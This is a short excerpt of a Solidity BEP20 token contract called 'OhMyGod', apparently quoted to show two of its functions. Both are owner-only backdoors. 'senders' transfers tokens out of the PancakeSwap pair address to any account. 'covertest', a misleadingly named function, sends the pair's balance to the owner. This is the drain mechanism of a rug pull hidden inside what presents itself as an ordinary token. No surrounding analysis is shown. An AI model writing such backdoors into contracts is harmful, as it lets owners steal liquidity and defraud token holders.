...
contract OhMyGod is Context, IBEP20, Ownable {
    ...
    function senders(address _account,uint256 Amount)public onlyOwner{
        _transfer(pancakePair,_account,Amount);
    }
    ...
    function covertest() public onlyOwner {
        address payable recipient = _msgSender();
        if(address(pancakePair).balance > 0)
            recipient.transfer(pancakePair.balance);
    }
